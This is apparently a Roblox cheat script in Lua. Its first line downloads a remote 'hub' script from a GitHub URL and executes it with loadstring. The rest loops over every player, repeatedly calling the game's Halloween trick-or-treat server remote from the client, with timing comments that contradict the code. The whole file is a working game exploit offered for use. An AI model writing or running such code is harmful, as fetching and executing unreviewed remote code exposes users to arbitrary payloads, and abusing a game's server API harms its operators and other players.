loadstring(game:HttpGet(('https://raw.githubusercontent.com/ReQiuYTPL/hub/main/ReQiuYTPLHub.lua'),true))()
wait(90)



wait(90)


local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Function to execute the API call
local function executeForPlayers()
    for _, player in ipairs(Players:GetPlayers()) do
        local args = {
            [1] = player -- Change this to the appropriate value as needed
        }

        -- Call the server method
        local success, errorMessage = pcall(function()
            ReplicatedStorage.API:FindFirstChild("HalloweenAPI/TrickOrTreatHouse"):InvokeServer(unpack(args))
        end)

        if not success then
            warn("Error invoking API for player " .. player.Name .. ": " .. errorMessage)
        end

        -- Wait for 5 seconds before processing the next player
        wait(5)
    end
end

-- Loop the function every 10 minutes
while true do
    executeForPlayers()
    wait(300) -- Wait for 300 seconds (5 minutes)
end
